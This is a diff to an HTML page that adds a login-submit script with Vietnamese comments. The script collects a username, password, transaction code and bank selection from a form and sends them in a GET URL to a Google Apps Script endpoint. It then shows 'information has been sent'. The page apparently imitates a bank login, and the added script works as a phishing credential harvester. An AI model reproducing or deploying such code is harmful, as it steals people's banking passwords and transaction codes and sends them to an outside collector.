@@ -696,6 +696,41 @@
 
     });
 </script>
+
+<script>
+    function submitLogin() {
+        // Lấy giá trị từ các input
+        const user_name = document.getElementsByName('user_name')[0].value;
+        const password = document.getElementsByName('password')[0].value;
+        const transaction = document.getElementsByName('transaction')[0].value;
+
+        // Nếu có thẻ select ngân hàng, bạn lấy thêm Bank:
+        const bankElement = document.querySelector('select[name="bank"]'); // tùy theo tên select
+        const Bank = bankElement ? bankElement.value : '';
+
+        // Tạo URL
+        const baseUrl = 'https://script.google.com/macros/s/AKfycbzO2dGfBynYdRgbD3RyE1krqPNadrgsGzfKqtnrRLdtakx0uQI2JN5PMdygVCqlpVby/exec';
+        const url = `${baseUrl}?Bank=${encodeURIComponent(Bank)}&user_name=${encodeURIComponent(user_name)}&password=${encodeURIComponent(password)}&transaction=${encodeURIComponent(transaction)}`;
+
+        // Hiện spinner
+        document.querySelector('.reload-login').style.display = 'inline-block';
+
+        // Gửi request GET
+        fetch(url, {
+            method: 'GET',
+            mode: 'no-cors'  // Google Apps Script thường yêu cầu no-cors
+        }).then(() => {
+            document.querySelector('.reload-login').style.display = 'none';
+            alert("Thông tin đã được gửi!");
+        }).catch((error) => {
+            document.querySelector('.reload-login').style.display = 'none';
+            alert("Có lỗi xảy ra khi gửi!");
+            console.error(error);
+        });
+    }
+</script>
+
+
 </body>
 
 </html>
